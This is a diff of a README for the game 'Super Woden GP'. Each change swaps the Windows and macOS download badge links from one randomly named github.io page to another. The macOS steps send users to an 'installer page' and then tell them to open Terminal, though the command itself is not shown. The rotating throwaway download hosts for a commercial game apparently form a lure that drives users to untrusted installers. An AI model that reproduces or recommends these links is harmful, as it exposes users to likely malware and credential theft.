@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Download Super Woden GP](https://img.shields.io/badge/⬇_Download_Super%20Woden%20GP-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Download Super Woden GP](https://img.shields.io/badge/⬇_Download_Super%20Woden%20GP-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -61,9 +61,9 @@ Super Woden GP is a charming top-down arcade racing game inspired by the golden 
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ Super Woden GP is a charming top-down arcade racing game inspired by the golden 
 
 <div align="center">
 
-[![⬇ Download Super Woden GP](https://img.shields.io/badge/⬇_Download_Super%20Woden%20GP-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Download Super Woden GP](https://img.shields.io/badge/⬇_Download_Super%20Woden%20GP-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -113,7 +113,7 @@ Super Woden GP is a charming top-down arcade racing game inspired by the golden 
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -138,7 +138,7 @@ Super Woden GP is a charming top-down arcade racing game inspired by the golden 
 
 <div align="center">
 
-[![⬇ Download Super Woden GP](https://img.shields.io/badge/⬇_Download_Super%20Woden%20GP-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Download Super Woden GP](https://img.shields.io/badge/⬇_Download_Super%20Woden%20GP-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
